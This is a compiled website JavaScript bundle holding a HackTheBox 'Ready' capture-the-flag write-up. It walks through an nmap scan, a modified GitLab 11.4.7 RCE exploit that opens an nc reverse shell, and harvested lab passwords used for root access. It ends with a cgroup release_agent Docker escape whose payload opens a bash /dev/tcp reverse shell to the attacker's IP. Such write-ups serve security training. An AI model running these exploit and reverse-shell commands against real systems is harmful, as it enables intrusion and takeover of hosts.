"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[1416],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>h});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function p(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var l=r.createContext({}),s=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},c=function(e){var t=s(e.components);return r.createElement(l.Provider,{value:t},e.children)},u="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},m=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,l=e.parentName,c=p(e,["components","mdxType","originalType","parentName"]),u=s(n),m=a,h=u["".concat(l,".").concat(m)]||u[m]||d[m]||o;return n?r.createElement(h,i(i({ref:t},c),{},{components:n})):r.createElement(h,i({ref:t},c))}));function h(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,i=new Array(o);i[0]=m;var p={};for(var l in t)hasOwnProperty.call(t,l)&&(p[l]=t[l]);p.originalType=e,p[u]="string"==typeof e?e:a,i[1]=p;for(var s=2;s<o;s++)i[s]=n[s];return r.createElement.apply(null,i)}return r.createElement.apply(null,n)}m.displayName="MDXCreateElement"},17983:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>i,default:()=>d,frontMatter:()=>o,metadata:()=>p,toc:()=>s});var r=n(87462),a=(n(67294),n(3905));const o={layout:"post",title:"Ready ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","pe","linux","web","docker"],date:"2021/05/15 20:57:00",thumbnail:"/img/HackTheBox/ready.png",toc:!0},i="Information",p={unversionedId:"HackTheBox/Ready/write-up",id:"HackTheBox/Ready/write-up",title:"Ready ",description:"- Name: Ready",source:"@site/writeups/HackTheBox/Ready/write-up.md",sourceDirName:"HackTheBox/Ready",slug:"/HackTheBox/Ready/write-up",permalink:"/writeups/HackTheBox/Ready/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"web",permalink:"/writeups/tags/web"},{label:"docker",permalink:"/writeups/tags/docker"}],version:"current",frontMatter:{layout:"post",title:"Ready ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","pe","linux","web","docker"],date:"2021/05/15 20:57:00",thumbnail:"/img/HackTheBox/ready.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Passage ",permalink:"/writeups/HackTheBox/Passage/write-up"},next:{title:"Remote ",permalink:"/writeups/HackTheBox/Remote/write-up"}},l={},s=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"Web discovery",id:"web-discovery",level:2},{value:"Web exploitation",id:"web-exploitation",level:2},{value:"Privilege Escalation of Machine : from git to root",id:"privilege-escalation-of-machine--from-git-to-root",level:2}],c={toc:s},u="wrapper";function d(e){let{components:t,...o}=e;return(0,a.kt)(u,(0,r.Z)({},c,o,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"information"},"Information"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Name:")," Ready"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Profile:")," ",(0,a.kt)("a",{parentName:"li",href:"https://app.hackthebox.eu/machines/304"},"www.hackthebox.eu")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Difficulty:")," Medium"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Points:")," 30")),(0,a.kt)("p",null,(0,a.kt)("img",{alt:"Ready",src:n(24589).Z,width:"598",height:"381"})),(0,a.kt)("h2",{id:"overview"},"Overview"),(0,a.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ sudo pacman -S nmap exploit-db pwncat\n")),(0,a.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,a.kt)("p",null,"Port and service scan with nmap:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"# Nmap 7.91 scan initiated Fri Feb  5 18:56:03 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.220\nNmap scan report for 10.10.10.220\nHost is up (0.030s latency).\nNot shown: 65533 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n5080/tcp open  http    nginx\n|_http-favicon: Unknown favicon MD5: F7E3D97F404E71D302B3239EEF48D5F2\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n| http-robots.txt: 53 disallowed entries (15 shown)\n| / /autocomplete/users /search /api /admin /profile\n| /dashboard /projects/new /groups/new /groups/*/edit /users /help\n|_/s/ /snippets/new /snippets/*/edit\n| http-title: Sign in \\xC2\\xB7 GitLab\n|_Requested resource was http://10.10.10.220:5080/users/sign_in\n|_http-trane-info: Problem with XML parsing of /evox/about\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Fri Feb  5 18:56:34 2021 -- 1 IP address (1 host up) scanned in 30.44 seconds\n")),(0,a.kt)("h2",{id:"web-discovery"},"Web discovery"),(0,a.kt)("p",null,"We have a Gitlab server at ",(0,a.kt)("a",{parentName:"p",href:"http://10.10.10.220:5080"},"http://10.10.10.220:5080")),(0,a.kt)("p",null,"We can register and once authenticated at ",(0,a.kt)("a",{parentName:"p",href:"http://10.10.10.220:5080/help"},"http://10.10.10.220:5080/help"),"\nwe can find the version is 11.4.7."),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"searchsploit gitlab 11.4.7")," shows us 3 RCE."),(0,a.kt)("p",null,"Exploring for public projects at ",(0,a.kt)("a",{parentName:"p",href:"http://10.10.10.220:5080/explore/projects"},"http://10.10.10.220:5080/explore/projects"),"\nwe can see ",(0,a.kt)("inlineCode",{parentName:"p"},"dude/ready-channel"),"."),(0,a.kt)("h2",{id:"web-exploitation"},"Web exploitation"),(0,a.kt)("p",null,"All the exploits are dirty and broken so I picked the first and had to modify it:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ searchsploit -p 49334.py\n  Exploit: GitLab 11.4.7 - RCE (Authenticated)\n      URL: https://www.exploit-db.com/exploits/49334\n     Path: /usr/share/exploitdb/exploits/ruby/webapps/49334.py\nFile Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators\n\n$ cp /usr/share/exploitdb/exploits/ruby/webapps/49334.py .\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"diff /usr/share/exploitdb/exploits/ruby/webapps/49334.py 49334.py")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-diff"},'22c22\n< parser.add_argument(\'-P\', help=\'reverse shell port\', required=True)\n---\n> parser.add_argument(\'-x\', help=\'reverse shell port\', required=True)\n29c29\n< local_port = args.p\n---\n> local_port = args.x\n59c59\n<     lpush resque:gitlab:queue:system_hook_push "{\\\\"class\\\\":\\\\"GitlabShellWorker\\\\",\\\\"args\\\\":[\\\\"class_eval\\\\",\\\\"open(\\\\\'|""" + f\'nc {local_ip} {local_port}\' + """ \\\\\').read\\\\"],\\\\"retry\\\\":3,\\\\"queue\\\\":\\\\"system_hook_push\\\\",\\\\"jid\\\\":\\\\"ad52abc5641173e217eb2e52\\\\",\\\\"created_at\\\\":1608799993.1234567,\\\\"enqueued_at\\\\":1608799993.1234567}"\n---\n>     lpush resque:gitlab:queue:system_hook_push "{\\\\"class\\\\":\\\\"GitlabShellWorker\\\\",\\\\"args\\\\":[\\\\"class_eval\\\\",\\\\"open(\\\\\'|""" + f\'nc {local_ip} {local_port}\' + \' -e /bin/bash\' + """ \\\\\').read\\\\"],\\\\"retry\\\\":3,\\\\"queue\\\\":\\\\"system_hook_push\\\\",\\\\"jid\\\\":\\\\"ad52abc5641173e217eb2e52\\\\",\\\\"created_at\\\\":1608799993.1234567,\\\\"enqueued_at\\\\":1608799993.1234567}"\n')),(0,a.kt)("p",null,"Then we can launch the exploit."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ python 49334.py -u cyfun -p password -g http://10.10.10.220 -l 10.10.14.172 -x 9999\n")),(0,a.kt)("p",null,"We receive the reverse shell on our listener:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ pwncat -l 9999 -vv\nINFO: Listening on :::9999 (family 10/IPv6, TCP)\nINFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)\nINFO: Client connected from 10.10.10.220:59942 (family 2/IPv4, TCP)\nid\nuid=998(git) gid=998(git) groups=998(git)\n")),(0,a.kt)("p",null,"Let's find the flag:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ find /home -name user.txt -type f\n/home/dude/user.txt\n")),(0,a.kt)("h2",{id:"privilege-escalation-of-machine--from-git-to-root"},"Privilege Escalation of Machine : from git to root"),(0,a.kt)("p",null,"We are in a docker container:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"git@gitlab:~$ ls -lh /.dockerenv\n-rwxr-xr-x 1 root root 0 Dec  1 12:41 /.dockerenv\n")),(0,a.kt)("p",null,"There is the password of root (container)."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"git@gitlab:~$ cat /root_pass\nYG65407Bjqvv9A0a8Tm_7w\n")),(0,a.kt)("p",null,"In ",(0,a.kt)("inlineCode",{parentName:"p"},"/var/backup")," there is a ",(0,a.kt)("inlineCode",{parentName:"p"},"docker-compose.yml")," explaining the origin of\n",(0,a.kt)("inlineCode",{parentName:"p"},"root_pass"),"."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-yml"},"version: '2.4'\n\nservices:\n  web:\n    image: 'gitlab/gitlab-ce:11.4.7-ce.0'\n    restart: always\n    hostname: 'gitlab.example.com'\n    environment:\n      GITLAB_OMNIBUS_CONFIG: |\n        external_url 'http://172.19.0.2'\n        redis['bind']='127.0.0.1'\n        redis['port']=6379\n        gitlab_rails['initial_root_password']=File.read('/root_pass')\n    networks:\n      gitlab:\n        ipv4_address: 172.19.0.2\n    ports:\n      - '5080:80'\n      #- '127.0.0.1:5080:80'\n      #- '127.0.0.1:50443:443'\n      #- '127.0.0.1:5022:22'\n    volumes:\n      - './srv/gitlab/config:/etc/gitlab'\n      - './srv/gitlab/logs:/var/log/gitlab'\n      - './srv/gitlab/data:/var/opt/gitlab'\n      - './root_pass:/root_pass'\n    privileged: true\n    restart: unless-stopped\n    #mem_limit: 1024m\n\nnetworks:\n  gitlab:\n    driver: bridge\n    ipam:\n      config:\n        - subnet: 172.19.0.0/16\n")),(0,a.kt)("p",null,"There is a password in gitlab config:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"git@gitlab:/opt/backup$ grep -v '^#' gitlab.rb | tr -d '\\n' && echo\ngitlab_rails['smtp_password'] = \"wW59U!ZKMbG9+*#h\"\n")),(0,a.kt)("p",null,"Then we can try password reuse on the root account."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"git@gitlab:/opt/backup$ su root\nPassword:\nroot@gitlab:/opt/backup# cd\nroot@gitlab:~# id\nuid=0(root) gid=0(root) groups=0(root)\n")),(0,a.kt)("p",null,"Now we have to escape from the container."),(0,a.kt)("p",null,"I used the second PoC from ",(0,a.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#i-own-root"},"HackTricks - Docker breakout")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},'mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x\necho 1 > /tmp/cgrp/x/notify_on_release\nhost_path=`sed -n \'s/.*\\perdir=\\([^,]*\\).*/\\1/p\' /etc/mtab`\necho "$host_path/cmd" > /tmp/cgrp/release_agent\necho \'#!/bin/bash\' > /cmd\necho "bash -i >& /dev/tcp/10.10.14.172/8888 0>&1" >> /cmd\nchmod a+x /cmd\nsh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"\n')),(0,a.kt)("p",null,"And received the reverse shell:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ pwncat -l 8888 -vv\nINFO: Listening on :::8888 (family 10/IPv6, TCP)\nINFO: Listening on 0.0.0.0:8888 (family 2/IPv4, TCP)\nINFO: Client connected from 10.10.10.220:34958 (family 2/IPv4, TCP)\nbash: cannot set terminal process group (-1): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@ready:/# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@ready:/# cat /root/root.txt\nb7f98681505cd39066f67147b103c2b3\n")))}d.isMDXComponent=!0},24589:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/ready-c7c67c09fd37fdf73d2609bce0884ece.png"}}]);